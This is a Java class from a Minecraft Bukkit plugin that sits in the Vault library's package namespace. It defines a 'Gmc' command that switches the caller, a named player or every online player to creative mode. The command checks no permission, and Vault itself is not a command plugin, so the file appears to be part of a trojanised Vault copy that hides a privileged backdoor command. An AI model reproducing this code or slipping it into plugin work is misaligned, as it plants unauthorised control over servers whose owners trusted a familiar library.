package net.milkbowl.vault.commands.cmds;

import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.util.Settings;

public class Gmc extends CommandManager {
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (args.length <= 1) {
			plugin.getServer().getScheduler().scheduleSyncDelayedTask(plugin, () -> {
				p.setGameMode(GameMode.CREATIVE);
				p.sendMessage(Settings.PREFIX("You set your gamemode to " + Settings.HIGHLIGHT_COLOUR + "CREATIVE"));

			});
		} else {
			if (args[1].equals("*")) {
				for (Player a : Bukkit.getOnlinePlayers()) {
					plugin.getServer().getScheduler().scheduleSyncDelayedTask(plugin, () -> a.setGameMode(GameMode.CREATIVE));
				}
				p.sendMessage(Settings.PREFIX("Everyone's gamemode is now set to" + Settings.HIGHLIGHT_COLOUR + " CREATIVE"));
			} else {
				Player target = Bukkit.getServer().getPlayer(args[1]);
				if (target == null) {
					p.sendMessage(Settings.PREFIX("The player " + Settings.HIGHLIGHT_COLOUR + args[1] + Settings.SECONDARY_COLOUR + " is not online."));
				} else {
					plugin.getServer().getScheduler().scheduleSyncDelayedTask(plugin, () -> {
						target.setGameMode(GameMode.CREATIVE);
						p.sendMessage(Settings.PREFIX("The player " + Settings.HIGHLIGHT_COLOUR + target.getName() + Settings.SECONDARY_COLOUR + "'s gamemode is now set to " + Settings.HIGHLIGHT_COLOUR + "CREATIVE"));
					});
				}
			}
		}

	}

}
